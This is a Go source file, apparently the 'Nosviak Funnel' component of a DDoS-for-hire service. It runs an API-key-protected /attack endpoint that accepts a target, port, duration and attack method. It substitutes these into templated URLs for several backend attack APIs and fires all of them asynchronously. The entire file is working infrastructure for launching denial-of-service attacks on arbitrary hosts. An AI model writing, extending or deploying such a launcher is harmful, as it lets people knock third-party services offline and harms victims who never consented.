package main

import (
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"net/url"
	"strconv"
	"strings"
 //"errors"
	"time"
)

type Configuration struct {
	ServerListener string            `json:"listener"`
	APIKey         string            `json:"api_key"`
	Timeout        int               `json:"timeout"`
	Methods        map[string]*Method `json:"methods"`
}

type Method struct {
	Enabled   bool `json:"enabled"`
	MaxLaunch int  `json:"maxtime"`
	Targets   []struct {
		Method     string   `json:"method"`
		TargetInfo []string `json:"target"`
		PathEn     bool     `json:"pathEncoding"`
		Verb       bool     `json:"verbosity"`
	} `json:"targets"`
}

var JsonConfig *Configuration = nil

func main() {
	fmt.Println("starting Nosviak - Funnel [v1.0]")

	FunnelConfig, err := ioutil.ReadFile("funnels.json")
	if err != nil {
		log.Panicf("ioutil.ReadFile: %s\r\n", err.Error())
	}

	var future Configuration
	if err := json.Unmarshal(FunnelConfig, &future); err != nil {
		log.Panicf("json.Unmarshal: %s\r\n", err.Error())
	}

	JsonConfig = &future

	http.HandleFunc("/attack", LaunchAttack)
	log.Panic(http.ListenAndServe(JsonConfig.ServerListener, nil))
}

func LaunchAttack(rw http.ResponseWriter, r *http.Request) {
	if len(r.URL.Query()) < 5 {
		rw.Write([]byte("INVALID URL QUERYS GIVEN"))
		return
	}

	fmt.Println(r.URL.Query())

	if r.URL.Query().Get("key") != JsonConfig.APIKey {
		rw.Write([]byte("Access Denied"))
		return
	}

	method := JsonConfig.Methods[r.URL.Query().Get("method")]
	if method == nil || !method.Enabled {
		rw.Write([]byte("INVALID METHOD GIVEN"))
		return
	}

	Target := r.URL.Query().Get("target")
	Duration, err := strconv.Atoi(r.URL.Query().Get("duration"))
	if err != nil {
		rw.Write([]byte("INVALID DURATION GIVEN"))
		return
	}

	Port, err := strconv.Atoi(r.URL.Query().Get("port"))
	if err != nil {
		rw.Write([]byte("INVALID PORT GIVEN"))
		return
	}

	if method.MaxLaunch > 0 && Duration > method.MaxLaunch {
		Duration = method.MaxLaunch
	}

	go LaunchAttacks(method, Target, Duration, Port) // Start the attacks asynchronously

	rw.Write([]byte("Attack sent")) // Return "Attack sent" immediately
}
func LaunchAttacks(method *Method, Attacktarget string, duration int, port int) error {
    for k, target := range method.Targets {
        for targetIndex, targetURL := range target.TargetInfo {
            var input string = targetURL

            if target.PathEn {
                input = strings.ReplaceAll(input, "<<$target>>", url.QueryEscape(Attacktarget))
                input = strings.ReplaceAll(input, "<<$duration>>", url.QueryEscape(strconv.Itoa(duration)))
                input = strings.ReplaceAll(input, "<<$port>>", url.QueryEscape(strconv.Itoa(port)))
                input = strings.ReplaceAll(input, "<<$method>>", url.QueryEscape(target.Method))
            } else {
                input = strings.ReplaceAll(input, "<<$target>>", Attacktarget)
                input = strings.ReplaceAll(input, "<<$duration>>", strconv.Itoa(duration))
                input = strings.ReplaceAll(input, "<<$port>>", strconv.Itoa(port))
                input = strings.ReplaceAll(input, "<<$method>>", target.Method)
            }
            cli := http.Client{
                Timeout: time.Duration(JsonConfig.Timeout) * time.Second,
            }

            if target.Verb {
                log.Printf("[VERBOSE] [%s] [%d] [creating request format]", target.Method, k)
            }

            req, err := http.NewRequest("GET", input, nil)
            if err != nil {
                log.Printf("[ERROR] [%s] [%d] [%d] Failed to create request: %s", target.Method, k, targetIndex, err.Error())
                continue // Skip this request and move to the next one
            }

            log.Printf("Sending request [%s] [%d] [%d] to URL: %s", target.Method, k, targetIndex, input)

            res, err := cli.Do(req)
            if err != nil {
                log.Printf("[ERROR] [%s] [%d] [%d] Failed to send request: %s", target.Method, k, targetIndex, err.Error())
                continue // Skip this request and move to the next one
            }
            defer res.Body.Close()

            if res.StatusCode != http.StatusOK {
                log.Printf("[ERROR] [%s] [%d] [%d] Bad response status: %d", target.Method, k, targetIndex, res.StatusCode)
                continue // Skip this request and move to the next one
            }

            // Read and log the response body
            responseBody, err := ioutil.ReadAll(res.Body)
            if err != nil {
                log.Printf("[ERROR] [%s] [%d] [%d] Failed to read response body: %s", target.Method, k, targetIndex, err.Error())
            } else {
                log.Printf("Response body [%s] [%d] [%d]: %s", target.Method, k, targetIndex, responseBody)
            }
        }
    }
    return nil // Return nil after trying all URLs
}